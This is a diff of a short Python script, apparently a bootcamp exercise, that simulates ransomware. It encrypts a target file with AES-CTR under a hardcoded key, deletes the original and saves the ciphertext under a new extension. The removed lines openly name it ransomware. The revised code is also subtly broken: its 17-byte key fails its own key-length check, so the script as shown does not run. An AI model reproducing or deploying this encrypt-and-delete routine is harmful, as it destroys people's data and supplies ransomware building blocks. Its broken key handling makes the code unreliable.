@@ -1,24 +1,42 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+def encrypt_file(file_name, key):
+    try:
+        # Verificar o tamanho da chave
+        if len(key) not in {16, 24, 32}:
+            raise ValueError("A chave deve ter 16, 24 ou 32 bytes para AES.")
 
-## remover o arquivo
-os.remove(file_name)
+        # Abrir o arquivo a ser criptografado
+        if not os.path.exists(file_name):
+            raise FileNotFoundError(f"O arquivo '{file_name}' não foi encontrado.")
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+        with open(file_name, "rb") as file:
+            file_data = file.read()
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+        # Criptografar os dados
+        aes = pyaes.AESModeOfOperationCTR(key)
+        crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+        # Remover o arquivo original
+        os.remove(file_name)
+
+        # Salvar o arquivo criptografado
+        new_file_name = file_name + ".crypto"
+        with open(new_file_name, "wb") as new_file:
+            new_file.write(crypto_data)
+
+        print(f"Arquivo criptografado com sucesso: {new_file_name}")
+
+    except FileNotFoundError as e:
+        print(e)
+    except ValueError as e:
+        print(f"Erro de chave: {e}")
+    except Exception as e:
+        print(f"Ocorreu um erro inesperado: {e}")
+
+# Nome do arquivo e chave de criptografia
+file_name = "challenge.txt"
+key = b"santanderbootcamp"
+
+encrypt_file(file_name, key)
